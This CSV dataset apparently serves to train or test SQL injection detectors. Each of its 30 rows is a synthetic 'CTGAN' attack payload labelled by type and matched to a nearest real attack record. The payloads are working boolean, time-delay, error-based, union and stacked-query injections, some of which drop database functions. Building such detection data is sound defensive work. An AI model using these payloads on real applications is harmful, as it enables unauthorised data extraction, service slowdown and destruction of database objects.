id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R005688,6.562986311074148
CTGAN_000002,attack,other,1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,nearest_attack_euclidean,R005511,8.145279707346504
CTGAN_000003,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R004157,10.394936685948462
CTGAN_000004,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R003948,7.383465743125725
CTGAN_000005,attack,other,if  (  6842  =  5446  )   select 6842 else drop function vjfq--,nearest_attack_euclidean,R004546,4.989823697211647
CTGAN_000006,attack,boolean,"x' and 1  =    (  select count  (  *  )   from tabname  )  , --",nearest_attack_euclidean,R000159,6.323187996230517
CTGAN_000007,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000484,39.995322749206764
CTGAN_000008,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008521,8.618683866185355
CTGAN_000009,attack,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",nearest_attack_euclidean,R000019,6.992123713976507
CTGAN_000010,attack,boolean,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R008146,4.449364809206094
CTGAN_000011,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",nearest_attack_euclidean,R008262,7.696030787988848
CTGAN_000012,attack,other, (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R005753,7.254917641993965
CTGAN_000013,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R007813,6.840860255210732
CTGAN_000014,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,20.248689184812953
CTGAN_000015,attack,other,"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002356,7.353936560944765
CTGAN_000016,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,6.6478561172214485
CTGAN_000017,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006436,19.006529904361543
CTGAN_000018,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",nearest_attack_euclidean,R008473,7.770662020155528
CTGAN_000019,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005922,9.681794609990808
CTGAN_000020,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,6.7679221660409485
CTGAN_000021,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R004705,7.441876142098667
CTGAN_000022,attack,boolean,"1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",nearest_attack_euclidean,R004475,5.932135411700294
CTGAN_000023,attack,boolean,"1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002472,6.089988458868752
CTGAN_000024,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.590922668900781
CTGAN_000025,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'acdu'  =  'acdu",nearest_attack_euclidean,R001539,18.947426030230627
CTGAN_000026,attack,time,1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001911,7.421219329377784
CTGAN_000027,attack,union,"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R008017,8.957196542739634
CTGAN_000028,attack,other,"1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R000900,9.220861785705482
CTGAN_000029,attack,error,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  -- wvjy",nearest_attack_euclidean,R002978,7.968199932724535
CTGAN_000030,attack,error,"-4785""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000774,8.679539585686339
